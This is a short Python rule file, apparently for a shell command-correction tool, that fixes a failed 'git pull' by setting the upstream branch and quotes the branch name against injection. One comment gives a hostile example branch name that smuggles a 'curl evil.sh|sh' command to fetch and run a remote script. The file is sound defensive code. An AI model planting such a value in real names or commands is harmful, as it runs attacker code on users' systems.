from thebleep.shells import shell
from thebleep.specific.git import git_support
from thebleep.utils import quote_words


@git_support
def match(command):
    return 'pull' in command.script and 'set-upstream' in command.output


@git_support
def get_new_command(command):
    line = command.output.split('\n')[-3].strip()
    branch = line.split(' ')[-1]
    set_upstream = line.replace('<remote>', 'origin')\
                       .replace('<branch>', branch)
    # The branch name arrives here twice -- in `--set-upstream-to=origin/<branch>`
    # and on its own -- and it comes from the repository, which is allowed to
    # name a branch `main;curl evil.sh|sh #`.
    return shell.and_(quote_words(set_upstream), command.script)
